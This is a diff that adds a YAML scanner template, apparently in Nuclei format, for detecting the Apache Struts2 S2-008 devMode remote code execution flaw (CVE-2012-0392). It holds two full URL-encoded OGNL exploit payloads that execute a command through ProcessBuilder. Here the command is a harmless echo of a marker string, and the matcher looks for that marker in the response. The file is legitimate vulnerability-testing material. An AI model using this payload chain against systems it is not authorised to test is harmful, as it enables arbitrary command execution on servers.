@@ -1,0 +1,31 @@
+id: local-struts2-s2-008-cmd-rce
+
+info:
+  name: Struts2 S2-008 DevMode Command Execution via debug=command (CVE-2012-0392)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-008 RCE via debug=command endpoint when devMode=true.
+    The expression parameter is evaluated as an OGNL expression allowing arbitrary
+    Java code execution. Payload unlocks static method access, executes echo via
+    Runtime.exec(), reads the output stream, and returns it via HttpServletResponse.
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-008
+    - https://nvd.nist.gov/vuln/detail/CVE-2012-0392
+  tags: safe-poc,exploit,struts2,s2-008,cve,cve2012,rce,devmode,ognl
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2008-rce%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2Cnew+java.lang.String%28%23e%29%29"
+      - "{{BaseURL}}/S2-008/devmode.action?debug=command&expression=%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2008-rce%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2Cnew+java.lang.String%28%23e%29%29"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2008-rce"
+      - type: status
+        status:
+          - 200
